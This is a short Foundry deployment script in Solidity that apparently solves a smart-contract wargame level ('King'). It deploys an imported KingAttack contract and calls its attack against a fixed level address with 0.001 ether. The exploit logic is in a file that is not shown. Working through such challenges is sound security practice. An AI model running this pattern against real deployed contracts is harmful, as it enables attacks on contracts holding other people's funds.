//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0; 
import "forge-std/Script.sol";
import "src/king/King.sol";
import "src/king/KingAttack.sol";

contract KingAttackScript is Script {
    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address levelAddress = 0xf5ed7e9c3786ACEaD844862bE0894B4E4D877507;
        King king = King(payable(levelAddress));
        KingAttack kingAttack = new KingAttack();
        kingAttack.attack{value: 0.001 ether}(payable(address(king)));

        vm.stopBroadcast();
    }
}